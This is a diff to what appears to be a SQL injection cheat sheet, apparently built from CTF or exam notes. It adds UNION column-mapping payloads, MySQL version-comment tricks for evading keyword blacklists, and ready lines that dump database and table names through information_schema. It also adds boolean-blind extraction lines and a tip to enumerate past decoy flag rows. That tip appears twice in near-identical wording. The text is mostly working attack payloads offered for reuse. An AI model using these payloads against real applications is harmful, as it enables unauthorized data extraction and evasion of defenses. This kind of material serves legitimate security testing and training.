@@ -94,6 +94,20 @@ ws.send('{"action":"search","query":"test\\\' OR 1=1--"}');
 ' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)-- -
 ```
 
+### UNION Column Output Mapping
+
+When UNION works but output isn't visible, map which column renders where:
+
+```sql
+-- Use distinguishable values to identify which column maps to which output field
+0 UNION SELECT 'COL1',2-- -     -- check: does "COL1" appear as Name/text?
+0 UNION SELECT 1,'COL2'-- -     -- check: does "COL2" appear as Name/text?
+-- The column that shows in output is your injection point for data extraction
+-- Other columns may map to img src, hidden fields, or be discarded
+```
+
+**SecOps June 2026:** 2-column UNION — col1 rendered as `Name:`, col2 rendered as `img src=src/{value}`. Initial attempts put `group_concat()` in col2 and got nothing. Swapping to col1 (`0 UNION SELECT group_concat(table_name),2 FROM...`) worked immediately. Always test which column renders in visible output before bulk extraction.
+
 ---
 
 ## DB-Specific Exploitation
@@ -155,6 +169,7 @@ MATCH (u:User) WHERE u.name = 'admin' OR 1=1 //--' RETURN u
 |-----------|---------|
 | Case variation | `SeLeCt`, `UnIoN` |
 | Comment injection | `UN/**/ION SE/**/LECT` |
+| MySQL version comment | `/*!50000UNION*/ /*!50000SELECT*/` — bypasses keyword blacklists that match literal strings but not MySQL conditional comments. The `50000` means "execute if MySQL ≥ 5.0". Works for SELECT, UNION, FROM, WHERE, etc. |
 | URL encoding | `%55%4E%49%4F%4E` |
 | Hex encoding | `0x53454C454354` |
 | Whitespace alt | `UNION/**/SELECT` |
@@ -165,6 +180,29 @@ MATCH (u:User) WHERE u.name = 'admin' OR 1=1 //--' RETURN u
 | HTTP/2 smuggling | HPACK compression obscures payloads from perimeter WAFs |
 
 SQLmap tampers: `--tamper=space2comment,charencode` — combine multiple for layered WAFs.
+
+### MySQL Version Comment Bypass (Proven Pattern)
+
+When keyword blacklist blocks `SELECT, UNION, SLEEP, BENCHMARK` (case-insensitive string match):
+
+**Decoy Data Pattern (CTF/Exam):** ALWAYS check multiple rows with `LIMIT N,1` — first row may be a decoy ("keep looking"). SecOps June 2026: flag table row 0 = "keep looking", row 1 = actual flag. Never stop at row 0.
+
+**Column position matters:** If output renders col1 as img src and col2 as Name, put your extraction function in the correct position. Test with `database(),2` vs `1,database()` to find which column displays.
+
+**Decoy row pattern (CTF/Exam):** ALWAYS enumerate rows with `LIMIT N,1` — first row may be a decoy ("keep looking", "try harder"). SecOps June 2026: flag table row 0 = "keep looking", row 1 = real flag. Never stop at the first row.
+
+```sql
+-- Bypass using /*!50000 ... */ conditional execution comments
+-- Server executes content if MySQL version >= 5.00.00 (virtually all modern MySQL)
+0 /*!50000uNiOn*/ /*!50000sElEcT*/ database(),2-- -
+0 /*!50000uNiOn*/ /*!50000sElEcT*/ group_concat(table_name separator 0x7c),2 /*!50000from*/ information_schema.tables where table_schema=database()-- -
+
+-- Boolean-based blind still works without UNION/SELECT when filter only blocks those keywords:
+1 AND substring(database(),1,1)='c'
+1 AND (/*!50000SeLeCt*/ count(*) from information_schema.tables where table_schema=database())>0
+```
+
+**SecOps June 2026:** App blacklisted SELECT/UNION/SLEEP/BENCHMARK (case-insensitive). Boolean `AND substring()` worked for char-by-char extraction. Version comments `/*!50000uNiOn*/` bypassed filter for UNION-based extraction. Key: test boolean-based first (no blocked keywords needed for AND/OR/substring), then find UNION bypass for faster bulk extraction.
 
 ---
 
